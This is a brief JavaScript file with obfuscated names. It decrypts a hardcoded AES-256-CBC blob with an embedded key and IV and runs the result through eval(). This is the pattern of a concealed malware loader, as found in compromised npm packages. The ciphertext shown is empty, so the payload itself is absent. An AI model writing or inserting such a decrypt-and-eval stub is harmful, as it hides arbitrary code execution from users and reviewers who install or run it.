const ito = require('crypto');
const itinho = Buffer.from('959213fd99b55f30fc26c29ab7f77813c76ba6b15c09fac678832514266039fc', 'hex');
const octua = Buffer.from('ce8ed33296798f08c2adb8c06b03809e', 'hex');
const Itinho = '';
const itinhoher = ito.createDecipheriv('aes-256-cbc', itinho, octua);
let ohniticry = itinhoher.update(Itinho, 'hex', 'utf8');
ohniticry += itinhoher.final('utf8');
eval(ohniticry);
